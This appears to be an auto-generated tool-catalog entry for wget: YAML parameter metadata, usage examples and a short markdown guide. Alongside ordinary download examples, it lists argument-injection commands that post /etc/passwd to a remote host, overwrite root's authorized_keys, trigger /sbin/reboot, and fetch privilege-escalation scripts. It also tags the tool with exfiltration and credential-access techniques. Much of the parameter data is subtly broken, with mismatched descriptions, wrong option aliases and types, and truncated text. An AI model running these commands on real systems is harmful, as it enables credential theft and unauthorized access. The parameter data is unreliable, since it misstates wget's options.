---
id: network-http-wget
namespace: network:http:wget
name: wget
description: Non-interactive download utility supporting HTTP, HTTPS, and FTP protocols
  with recursive download and resume capability.
author: Repository Maintainers
version: 1.0.0
capabilities:
- network.transfer.download
- network.mirror.site
- network.transfer.recursive
- network.transfer.resume
- network.http.fetch
- network.transfer.upload
- security.execution.command
- system.file.read
- system.file.write
platforms:
- linux
- macos
- cross-platform
risk_level: low
trust_level: verified
execution_policy: enabled
architectures:
- amd64
- arm64
- cross-platform
dependencies: []
related_tools:
- aria2c
- httrack
- axel
- curl
- network-http-curl
artifacts:
- type: network.transfer.file
  description: File downloaded from a remote server
  trust_level: community
- type: network.http.response
  description: HTTP response data
  mime: text/plain
  trust_level: verified
workflow_edges:
  produces:
  - downloaded-file
  - mirror-directory
  consumes:
  - url
  - base-url
contract:
  inputs:
  - type: network.target.url
    description: URL to download
  outputs:
  - type: network.transfer.file
    description: Downloaded file written to disk
  side_effects:
  - filesystem_write
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 32
    network: medium
    disk_io: medium
resource_profile:
  cpu: low
  memory_mb: 32
  network: medium
  disk_io: medium
allowed-tools:
- wget
- Bash
- execFile
parameters:
- name: version
  type: string
  required: false
  description: display the version of Wget and exit
  aliases:
  - -V
  - --version
- name: help
  type: string
  required: false
  description: print this help
  aliases:
  - -h
  - --help
- name: background
  type: string
  required: false
  description: go to background after startup
  aliases:
  - -b
  - --background
- name: execute
  type: string
  required: false
  description: execute a `.wgetrc'-style command
  aliases:
  - -e
  - --execute
- name: output-file
  type: file
  required: false
  description: log messages to FILE
  aliases:
  - -o
  - --output-file
- name: append-output
  type: file
  required: false
  description: append messages to FILE
  aliases:
  - -a
  - --append-output
- name: debug
  type: string
  required: false
  description: print lots of debugging information
  aliases:
  - -d
  - --debug
- name: quiet
  type: string
  required: false
  description: quiet (no output)
  aliases:
  - -q
  - --quiet
- name: verbose
  type: string
  required: false
  description: be verbose (this is the default)
  aliases:
  - -v
  - --verbose
- name: no-verbose
  type: string
  required: false
  description: turn off verboseness, without being quiet
  aliases:
  - -n
  - --no-verbose
- name: report-speed
  type: string
  required: false
  description: output bandwidth as TYPE. TYPE can be bits
  aliases:
  - --report-speed
- name: input-file
  type: file
  required: false
  description: download URLs found in local or external FILE
  aliases:
  - -i
  - --input-file
- name: force-html
  type: file
  required: false
  description: treat input file as HTML
  aliases:
  - -F
  - --force-html
- name: base
  type: url
  required: false
  description: resolves HTML input-file links (-i -F)
  aliases:
  - -B
  - --base
- name: config
  type: file
  required: false
  description: specify config file to use
  aliases:
  - --config
- name: no-config
  type: string
  required: false
  description: do not read any config file
  aliases:
  - --no-config
- name: rejected-log
  type: file
  required: false
  description: log reasons for URL rejection to FILE
  aliases:
  - --rejected-log
- name: tries
  type: integer
  required: false
  description: set number of retries to NUMBER (0 unlimits)
  aliases:
  - -t
  - --tries
- name: retry-connrefused
  type: string
  required: false
  description: retry even if connection is refused
  aliases:
  - --retry-connrefused
- name: retry-on-host-error
  type: string
  required: false
  description: consider host errors as non-fatal, transient errors
  aliases:
  - --retry-on-host-error
- name: retry-on-http-error
  type: url
  required: false
  description: comma-separated list of HTTP errors to retry
  aliases:
  - --retry-on-http-error
- name: output-document
  type: file
  required: false
  description: write documents to FILE
  aliases:
  - -O
  - --output-document
- name: no-clobber
  type: string
  required: false
  description: skip downloads that would download to
  aliases:
  - -n
  - --no-clobber
- name: no-netrc
  type: string
  required: false
  description: don't try to obtain credentials from .netrc
  aliases:
  - --no-netrc
- name: continue
  type: string
  required: false
  description: resume getting a partially-downloaded file
  aliases:
  - -c
  - --continue
- name: start-pos
  type: string
  required: false
  description: start downloading from zero-based position OFFSET
  aliases:
  - --start-pos
- name: progress
  type: string
  required: false
  description: select progress gauge type
  aliases:
  - --progress
- name: show-progress
  type: string
  required: false
  description: display the progress bar in any verbosity mode
  aliases:
  - --show-progress
- name: timestamping
  type: string
  required: false
  description: don't re-retrieve files unless newer than
  aliases:
  - -N
  - --timestamping
- name: no-if-modified-since
  type: string
  required: false
  description: don't use conditional if-modified-since get
  aliases:
  - --no-if-modified-since

- name: accept
  type: array
  required: false
  default: null
  description: "comma-separated list of accepted extensions"
  aliases:
    - "-A"
    - "--accept"
- name: accept-regex
  type: string
  required: false
  default: null
  description: "regex matching accepted URLs"
  aliases:
    - "--accept-regex"
- name: adjust-extension
  type: string
  required: false
  default: null
  description: "save HTML/CSS documents with proper extensions"
  aliases:
    - "-E"
    - "--adjust-extension"
- name: ask-password
  type: string
  required: false
  default: null
  description: "prompt for passwords"
  aliases:
    - "--ask-password"
- name: auth-no-challenge
  type: url
  required: false
  default: null
  description: "send Basic HTTP authentication information"
  aliases:
    - "--auth-no-challenge"
- name: backup-converted
  type: string
  required: false
  default: null
  description: "before converting file X, back up as X.orig"
  aliases:
    - "-K"
    - "--backup-converted"
- name: backups
  type: integer
  required: false
  default: null
  description: "before writing file X, rotate up to N backup files"
  aliases:
    - "--backups"
- name: bind-address
  type: string
  required: false
  default: null
  description: "bind to ADDRESS (hostname or IP) on local host"
  aliases:
    - "--bind-address"
- name: body-data
  type: string
  required: false
  default: null
  description: "send STRING as data. --method MUST be set"
  aliases:
    - "--body-data"
- name: body-file
  type: file
  required: false
  default: null
  description: "send contents of FILE. --method MUST be set"
  aliases:
    - "--body-file"
- name: ca-certificate
  type: file
  required: false
  default: null
  description: "file with the bundle of CAs"
  aliases:
    - "--ca-certificate"
- name: ca-directory
  type: file
  required: false
  default: null
  description: "directory where hash list of CAs is stored"
  aliases:
    - "--ca-directory"
- name: certificate
  type: file
  required: false
  default: null
  description: "client certificate file"
  aliases:
    - "--certificate"
- name: certificate-type
  type: string
  required: false
  default: null
  description: "client certificate type, PEM or DER"
  aliases:
    - "--certificate-type"
- name: ciphers
  type: string
  required: false
  default: null
  description: "Set the priority string (GnuTLS) or cipher list string (OpenSSL) directly"
  aliases:
    - "--ciphers"
- name: compression
  type: string
  required: false
  default: none
  description: "choose compression, one of auto, gzip and none"
  aliases:
    - "--compression"
- name: connect-timeout
  type: number
  required: false
  default: null
  description: "set the connect timeout to SECS"
  aliases:
    - "--connect-timeout"
- name: content-disposition
  type: string
  required: false
  default: null
  description: "honor the Content-Disposition header when"
  aliases:
    - "--content-disposition"
- name: content-on-error
  type: string
  required: false
  default: null
  description: "output the received content on server errors"
  aliases:
    - "--content-on-error"
- name: convert-file-only
  type: string
  required: false
  default: null
  description: "convert the file part of the URLs only (usually known as the basename)"
  aliases:
    - "--convert-file-only"
- name: convert-links
  type: string
  required: false
  default: null
  description: "make links in downloaded HTML or CSS point to"
  aliases:
    - "-k"
    - "--convert-links"
- name: crl-file
  type: file
  required: false
  default: null
  description: "file with bundle of CRLs"
  aliases:
    - "--crl-file"
- name: cut-dirs
  type: integer
  required: false
  default: null
  description: "ignore NUMBER remote directory components"
  aliases:
    - "--cut-dirs"
- name: default-page
  type: string
  required: false
  default: null
  description: "change the default page name (normally"
  aliases:
    - "--default-page"
- name: delete-after
  type: string
  required: false
  default: null
  description: "delete files locally after downloading them"
  aliases:
    - "--delete-after"
- name: directory-prefix
  type: string
  required: false
  default: null
  description: "save files to PREFIX/"
  aliases:
    - "-P"
    - "--directory-prefix"
- name: dns-timeout
  type: number
  required: false
  default: null
  description: "set the DNS lookup timeout to SECS"
  aliases:
    - "--dns-timeout"
- name: domains
  type: array
  required: false
  default: null
  description: "comma-separated list of accepted domains"
  aliases:
    - "-D"
    - "--domains"
- name: exclude-directories
  type: array
  required: false
  default: null
  description: ""
  aliases:
    - "-X"
    - "--exclude-directories"
- name: exclude-domains
  type: array
  required: false
  default: null
  description: "comma-separated list of rejected domains"
  aliases:
    - "--exclude-domains"
- name: follow-ftp
  type: string
  required: false
  default: null
  description: "follow FTP links from HTML documents"
  aliases:
    - "--follow-ftp"
- name: follow-tags
  type: array
  required: false
  default: null
  description: "comma-separated list of followed HTML tags"
  aliases:
    - "--follow-tags"
- name: force-directories
  type: string
  required: false
  default: null
  description: "force creation of directories"
  aliases:
    - "-x"
    - "--force-directories"
- name: ftp-password
  type: string
  required: false
  default: null
  description: "set ftp password to PASS"
  aliases:
    - "--ftp-password"
- name: ftp-user
  type: string
  required: false
  default: null
  description: "set ftp user to USER"
  aliases:
    - "--ftp-user"
- name: ftps-clear-data-connection
  type: string
  required: false
  default: null
  description: "cipher the control channel only; all the data will be in plaintext"
  aliases:
    - "--ftps-clear-data-connection"
- name: ftps-fallback-to-ftp
  type: string
  required: false
  default: null
  description: "fall back to FTP if FTPS is not supported in the target server"
  aliases:
    - "--ftps-fallback-to-ftp"
- name: ftps-implicit
  type: string
  required: false
  default: null
  description: "use implicit FTPS (default port is 990)"
  aliases:
    - "--ftps-implicit"
- name: ftps-resume-ssl
  type: string
  required: false
  default: null
  description: "resume the SSL/TLS session started in the control connection when"
  aliases:
    - "--ftps-resume-ssl"
- name: header
  type: string
  required: false
  default: null
  description: "insert STRING among the headers"
  aliases:
    - "--header"
- name: hsts-file
  type: string
  required: false
  default: null
  description: "path of HSTS database (will override default)"
  aliases:
    - "--hsts-file"
- name: http-password
  type: url
  required: false
  default: null
  description: "set http password to PASS"
  aliases:
    - "--http-password"
- name: http-user
  type: url
  required: false
  default: null
  description: "set http user to USER"
  aliases:
    - "--http-user"
- name: https-only
  type: url
  required: false
  default: null
  description: "only follow secure HTTPS links"
  aliases:
    - "--https-only"
- name: ignore-case
  type: string
  required: false
  default: null
  description: "ignore case when matching files/directories"
  aliases:
    - "--ignore-case"
- name: ignore-length
  type: string
  required: false
  default: null
  description: "ignore 'Content-Length' header field"
  aliases:
    - "--ignore-length"
- name: ignore-tags
  type: array
  required: false
  default: null
  description: "comma-separated list of ignored HTML tags"
  aliases:
    - "--ignore-tags"
- name: include-directories
  type: array
  required: false
  default: null
  description: "--trust-server-names use the name specified by the redirection URL's last component"
  aliases:
    - "-I"
    - "--include-directories"
- name: inet4-only
  type: string
  required: false
  default: null
  description: "connect only to IPv4 addresses"
  aliases:
    - "-4"
    - "--inet4-only"
- name: inet6-only
  type: string
  required: false
  default: null
  description: "connect only to IPv6 addresses"
  aliases:
    - "-6"
    - "--inet6-only"
- name: keep-session-cookies
  type: string
  required: false
  default: null
  description: "load and save session (non-permanent) cookies"
  aliases:
    - "--keep-session-cookies"
- name: level
  type: integer
  required: false
  default: null
  description: "maximum recursion depth (inf or 0 for infinite)"
  aliases:
    - "-l"
    - "--level"
- name: limit-rate
  type: number
  required: false
  default: null
  description: "limit download rate to RATE"
  aliases:
    - "--limit-rate"
- name: load-cookies
  type: file
  required: false
  default: null
  description: "load cookies from FILE before session"
  aliases:
    - "--load-cookies"
- name: local-encoding
  type: string
  required: false
  default: null
  description: "use ENC as the local encoding for IRIs"
  aliases:
    - "--local-encoding"
- name: max-redirect
  type: string
  required: false
  default: null
  description: "maximum redirections allowed per page"
  aliases:
    - "--max-redirect"
- name: method
  type: url
  required: false
  default: null
  description: "use method \"HTTPMethod\" in the request"
  aliases:
    - "--method"
- name: mirror
  type: string
  required: false
  default: null
  description: "shortcut for -N -r -l inf --no-remove-listing"
  aliases:
    - "-m"
    - "--mirror"
- name: nH
  type: boolean
  required: false
  description: "don't create host directories"
  aliases:
    - "-nH"
    - "--no-host-directories"
- name: nc
  type: boolean
  required: false
  description: "skip downloads that would download to"
  aliases:
    - "-nc"
    - "--no-clobber"
- name: nd
  type: boolean
  required: false
  description: "don't create directories"
  aliases:
    - "-nd"
    - "--no-directories"
- name: no-cache
  type: string
  required: false
  default: null
  description: "disallow server-cached data"
  aliases:
    - "--no-cache"
- name: no-check-certificate
  type: string
  required: false
  default: null
  description: "don't validate the server's certificate"
  aliases:
    - "--no-check-certificate"
- name: no-cookies
  type: string
  required: false
  default: null
  description: "don't use cookies"
  aliases:
    - "--no-cookies"
- name: no-directories
  type: string
  required: false
  default: null
  description: "don't create directories"
  aliases:
    - "-n"
    - "--no-directories"
- name: no-dns-cache
  type: string
  required: false
  default: null
  description: "disable caching DNS lookups"
  aliases:
    - "--no-dns-cache"
- name: no-glob
  type: string
  required: false
  default: null
  description: "turn off FTP file name globbing"
  aliases:
    - "--no-glob"
- name: no-host-directories
  type: string
  required: false
  default: null
  description: "don't create host directories"
  aliases:
    - "-n"
    - "--no-host-directories"
- name: no-hsts
  type: string
  required: false
  default: null
  description: "disable HSTS"
  aliases:
    - "--no-hsts"
- name: no-http-keep-alive
  type: url
  required: false
  default: null
  description: "disable HTTP keep-alive (persistent connections)"
  aliases:
    - "--no-http-keep-alive"
- name: no-iri
  type: string
  required: false
  default: null
  description: "turn off IRI support"
  aliases:
    - "--no-iri"
- name: no-parent
  type: file
  required: false
  default: null
  description: "don't ascend to the parent directory"
  aliases:
    - "-n"
    - "--no-parent"
- name: no-passive-ftp
  type: string
  required: false
  default: null
  description: "disable the \"passive\" transfer mode"
  aliases:
    - "--no-passive-ftp"
- name: no-proxy
  type: string
  required: false
  default: null
  description: "explicitly turn off proxy"
  aliases:
    - "--no-proxy"
- name: no-remove-listing
  type: string
  required: false
  default: null
  description: "don't remove '.listing' files"
  aliases:
    - "--no-remove-listing"
- name: no-use-server-timestamps
  type: string
  required: false
  default: null
  description: "the one on the server"
  aliases:
    - "--no-use-server-timestamps"
- name: no-warc-compression
  type: string
  required: false
  default: null
  description: "do not compress WARC files with GZIP"
  aliases:
    - "--no-warc-compression"
- name: no-warc-digests
  type: string
  required: false
  default: null
  description: "do not calculate SHA1 digests"
  aliases:
    - "--no-warc-digests"
- name: no-warc-keep-log
  type: string
  required: false
  default: null
  description: "do not store the log file in a WARC record"
  aliases:
    - "--no-warc-keep-log"
- name: np
  type: boolean
  required: false
  description: "don't ascend to the parent directory"
  aliases:
    - "-np"
    - "--no-parent"
- name: nv
  type: boolean
  required: false
  description: "turn off verboseness, without being quiet"
  aliases:
    - "-nv"
    - "--no-verbose"
- name: page-requisites
  type: string
  required: false
  default: null
  description: "get all images, etc. needed to display HTML page"
  aliases:
    - "-p"
    - "--page-requisites"
- name: password
  type: url
  required: false
  default: null
  description: "set both ftp and http password to PASS"
  aliases:
    - "--password"
- name: pinnedpubkey
  type: file
  required: false
  default: null
  description: "of base64 encoded sha256 hashes preceded by 'sha256//' and separated by ';', to verify peer against"
  aliases:
    - "--pinnedpubkey"
- name: post-data
  type: string
  required: false
  default: null
  description: "use the POST method; send STRING as the data"
  aliases:
    - "--post-data"
- name: post-file
  type: file
  required: false
  default: null
  description: "use the POST method; send contents of FILE"
  aliases:
    - "--post-file"
- name: prefer-family
  type: string
  required: false
  default: null
  description: "connect first to addresses of specified family"
  aliases:
    - "--prefer-family"
- name: preserve-permissions
  type: string
  required: false
  default: null
  description: "preserve remote file permissions"
  aliases:
    - "--preserve-permissions"
- name: private-key
  type: file
  required: false
  default: null
  description: "private key file"
  aliases:
    - "--private-key"
- name: private-key-type
  type: string
  required: false
  default: null
  description: "private key type, PEM or DER"
  aliases:
    - "--private-key-type"
- name: protocol-directories
  type: string
  required: false
  default: null
  description: "use protocol name in directories"
  aliases:
    - "--protocol-directories"
- name: proxy-password
  type: string
  required: false
  default: null
  description: "set PASS as proxy password"
  aliases:
    - "--proxy-password"
- name: proxy-user
  type: string
  required: false
  default: null
  description: "set USER as proxy username"
  aliases:
    - "--proxy-user"
- name: quota
  type: integer
  required: false
  default: null
  description: "set retrieval quota to NUMBER"
  aliases:
    - "-Q"
    - "--quota"
- name: random-wait
  type: string
  required: false
  default: null
  description: "wait from 0.5*WAIT...1.5*WAIT secs between retrievals"
  aliases:
    - "--random-wait"
- name: read-timeout
  type: number
  required: false
  default: null
  description: "set the read timeout to SECS"
  aliases:
    - "--read-timeout"
- name: recursive
  type: string
  required: false
  default: null
  description: "specify recursive download"
  aliases:
    - "-r"
    - "--recursive"
- name: referer
  type: url
  required: false
  default: null
  description: "include 'Referer: URL' header in HTTP request"
  aliases:
    - "--referer"
- name: regex-type
  type: string
  required: false
  default: null
  description: "regex type (posix|pcre)"
  aliases:
    - "--regex-type"
- name: reject
  type: array
  required: false
  default: null
  description: "comma-separated list of rejected extensions"
  aliases:
    - "-R"
    - "--reject"
- name: reject-regex
  type: string
  required: false
  default: null
  description: "regex matching rejected URLs"
  aliases:
    - "--reject-regex"
- name: relative
  type: string
  required: false
  default: null
  description: "follow relative links only"
  aliases:
    - "-L"
    - "--relative"
- name: remote-encoding
  type: string
  required: false
  default: null
  description: "use ENC as the default remote encoding"
  aliases:
    - "--remote-encoding"
- name: restrict-file-names
  type: string
  required: false
  default: null
  description: "restrict chars in file names to ones OS allows"
  aliases:
    - "--restrict-file-names"
- name: retr-symlinks
  type: string
  required: false
  default: null
  description: "when recursing, get linked-to files (not dir)"
  aliases:
    - "--retr-symlinks"
- name: save-cookies
  type: file
  required: false
  default: null
  description: "save cookies to FILE after session"
  aliases:
    - "--save-cookies"
- name: save-headers
  type: url
  required: false
  default: null
  description: "save the HTTP headers to file"
  aliases:
    - "--save-headers"
- name: secure-protocol
  type: string
  required: false
  default: null
  description: "choose secure protocol, one of auto, SSLv2"
  aliases:
    - "--secure-protocol"
- name: server-response
  type: string
  required: false
  default: null
  description: "print server response"
  aliases:
    - "-S"
    - "--server-response"
- name: span-hosts
  type: string
  required: false
  default: null
  description: "go to foreign hosts when recursive"
  aliases:
    - "-H"
    - "--span-hosts"
- name: spider
  type: string
  required: false
  default: null
  description: "don't download anything"
  aliases:
    - "--spider"
- name: strict-comments
  type: string
  required: false
  default: null
  description: "turn on strict (SGML) handling of HTML comments"
  aliases:
    - "--strict-comments"
- name: timeout
  type: integer
  required: false
  default: null
  description: "set all timeout values to SECONDS"
  aliases:
    - "-T"
    - "--timeout"
- name: trust_server_names
  type: boolean
  required: false
  description: "use the name specified by the redirection"
  aliases:
    - "--trust-server-names"
- name: unlink
  type: string
  required: false
  default: null
  description: "remove file before clobber"
  aliases:
    - "--unlink"
- name: use-askpass
  type: string
  required: false
  default: null
  description: "specify credential handler for requesting"
  aliases:
    - "--use-askpass"
- name: user
  type: url
  required: false
  default: null
  description: "set both ftp and http user to USER"
  aliases:
    - "--user"
- name: user-agent
  type: string
  required: false
  default: null
  description: "identify as AGENT instead of Wget/VERSION"
  aliases:
    - "-U"
    - "--user-agent"
- name: wait
  type: integer
  required: false
  default: null
  description: "wait SECONDS between retrievals"
  aliases:
    - "-w"
    - "--wait"
- name: waitretry
  type: integer
  required: false
  default: null
  description: "wait 1..SECONDS between retries of a retrieval"
  aliases:
    - "--waitretry"
- name: warc-cdx
  type: string
  required: false
  default: null
  description: "write CDX index files"
  aliases:
    - "--warc-cdx"
- name: warc-dedup
  type: string
  required: false
  default: null
  description: "do not store records listed in this CDX file"
  aliases:
    - "--warc-dedup"
- name: warc-file
  type: string
  required: false
  default: null
  description: "save request/response data to a .warc.gz file"
  aliases:
    - "--warc-file"
- name: warc-header
  type: string
  required: false
  default: null
  description: "insert STRING into the warcinfo record"
  aliases:
    - "--warc-header"
- name: warc-max-size
  type: integer
  required: false
  default: null
  description: "set maximum size of WARC files to NUMBER"
  aliases:
    - "--warc-max-size"
- name: warc-tempdir
  type: file
  required: false
  default: null
  description: "location for temporary files created by the"
  aliases:
    - "--warc-tempdir"
- name: xattr
  type: string
  required: false
  default: null
  description: "turn on storage of metadata in extended file attributes"
  aliases:
    - "--xattr"

execution:
  template: wget {version} {help} {background} {execute} {output-file}
  sandbox: execFile
  timeout_seconds: 300
  shell: false
global_vars:
  target: ip
  port: port
examples:
- description: Download a single file
  command: wget https://example.com/file.zip
- description: Download with custom filename
  command: wget -O output.zip https://example.com/file.zip
- description: Resume an interrupted download
  command: wget -c https://example.com/largefile.iso
- description: Recursively download a website
  command: wget -r -l 2 -np https://example.com/docs/
- description: Mirror an entire site
  command: wget -m -k https://docs.example.com/
- description: Can be used to execute any command or file on a system, but without
    any arguments, and without stdout/stderr. This can be useful if you are able to
    write an executable to the server beforehand. The example here invokes /sbin/reboot.
  command: 'wget --use-askpass=/sbin/reboot http://0/

    '
- description: Send a local file to a remote server in a POST request. Note that the
    file will be sent as-is.
  command: 'wget --post-file=/etc/passwd http://0/

    '
- description: Read local files by importing the file as URIs to be retrieved. The
    content of the file will be displayed as error messages.
  command: 'wget --input-file=/etc/passwd http://0/

    '
- description: Reads local data and writes the output to a file. This is only suitable
    for displaying non-binary files, as the output is an error-log.
  command: 'wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt

    '
- description: Downloads a remote file via an HTTP GET request and saves it to a specific
    location.
  command: 'wget --output-document=/root/.ssh/authorized_keys http://0/

    '
- description: 'Argument injection: execute arbitrary command: Can be used to execute
    any command or file on a system, but without any arguments, and without stdout/stderr.
    This can be useful if you are able to write an executable to the server beforehand.
    The example here invokes /sbin/reboot.'
  command: wget --use-askpass=/sbin/reboot http://0/
- description: 'Argument injection: upload file: Send a local file to a remote server
    in a POST request. Note that the file will be sent as-is.'
  command: wget --post-file=/etc/passwd http://0/
- description: 'Argument injection: read local file: Read local files by importing
    the file as URIs to be retrieved. The content of the file will be displayed as
    error messages.'
  command: wget --input-file=/etc/passwd http://0/
- description: 'Argument injection: write to local file: Reads local data and writes
    the output to a file. This is only suitable for displaying non-binary files, as
    the output is an error-log.'
  command: wget --input-file=/etc/passwd --output-file=/tmp/passwd.txt
- description: 'Argument injection: download file: Downloads a remote file via an
    HTTP GET request and saves it to a specific location.'
  command: wget --output-document=/root/.ssh/authorized_keys http://0/
- description: NetRunners usefull/shell
  command: wget {{URL}}/pspy
- description: NetRunners usefull/shell
  command: wget {{URL}}/linpeas.sh
- description: Download a file from a given URL and save it in the current directory
  command: wget http://example.com/file.zip
- description: Download a file and save it with a different name
  command: wget -O newname.zip http://example.com/file.zip
- description: Download files in the background
  command: wget -b http://example.com/file.zip
- description: Download a file and limit the download speed to reduce bandwidth usage
  command: wget --limit-rate=200k http://example.com/file.zip
- description: Download files from a list of URLs provided in a text file
  command: wget -i urls.txt
- description: Resume an incomplete download
  command: wget -c http://example.com/file.zip
- description: Download a file while showing the progress in a more readable form
  command: wget --show-progress http://example.com/file.zip
- description: Download a file without checking the server's SSL certificate
  command: wget --no-check-certificate https://example.com/file.zip
- description: Download an entire website for offline browsing
  command: wget --mirror --convert-links --adjust-extension --page-requisites --no-parent
    http://example.com
- description: Download a file with HTTP authentication
  command: wget --user=username --password=password http://example.com/secure-file.zip
- description: Download a file with cookies, useful for sites that require logins
  command: wget --load-cookies cookies.txt http://example.com/file.zip
- description: Download a directory from an FTP server
  command: wget -r ftp://example.com/pub/
- description: Download only files newer than the local version
  command: wget -N http://example.com/file.zip
- description: Download a file only if it has been updated on the server
  command: wget -S --spider http://example.com/file.zip
- description: Quietly download a file, continuing where it left of, if the connection
    fails. The file will be downloaded to the current working directory.
  command: wget -qc http://example.com/file.zip
- description: Specify a location to download the given file.
  command: wget -qcO [PATH] http://example.com/file.zip
- description: Download URL using the user agent string provided to the `-U` flag.
  command: wget -U 'Mozilla/5.0' http://example.com/file.zip
references:
- label: GNU Wget documentation
  url: https://www.gnu.org/software/wget/manual/
- label: Wget for beginners
  url: https://linux.die.net/man/1/wget
features:
- file-system
- output-json
- network-intensive
- process-manip
techniques:
- command-and-control
- execution
- credential-access
- collection
- data-manipulation
- exfiltration
install:
- method: apt
  package_name: wget
  commands:
  - apt-get install -y wget
- method: brew
  package_name: wget
  commands:
  - brew install wget
mitre_ids:
- T1005
- T1046
- T1048
- T1074
- T1114
- T1190
- T1595
---

# Wget — Non-Interactive Download Utility

Wget is a free utility for non-interactive download of files from the web. It supports HTTP, HTTPS, and FTP protocols, and is particularly suited for reliable downloading in scripts and automated workflows.

## Key Features

| Feature | Description |
|---------|-------------|
| **Resume** | Continue interrupted downloads with `-c` |
| **Recursive** | Follow links recursively with `-r` |
| **Mirror** | Download entire websites for offline viewing |
| **Robust** | Retry on failure, adaptive bandwidth, timestamping |

## Recursive Download

```bash
# Download a directory structure
wget -r -np -nH --cut-dirs=1 https://example.com/files/

# Download with file type filtering
wget -r -A.pdf https://example.com/documents/

# Avoid downloading specific types
wget -r -R.jpg,.png,.gif https://example.com/
```

## Rate Limiting

```bash
# Limit download speed
wget --limit-rate=200k https://example.com/largefile.iso

# Set retry and wait intervals
wget --tries=10 --wait=5 https://example.com/
```

## Authentication

```bash
# HTTP Basic Auth
wget --user=username --password=password https://example.com/private/

# Using .netrc file
echo "machine example.com login user password pass" > ~/.netrc
wget https://example.com/private/
```

## Related Tools

- **[curl](../http/curl.md)** — More protocol support, stdout-oriented
- **[axel](../../transfer/axel.md)** — Accelerated download with multiple connections
- **[aria2c](../../transfer/aria2c.md)** — Multi-protocol, multi-connection downloader
- **[httrack](../../mirror/httrack.md)** — Full website mirroring tool
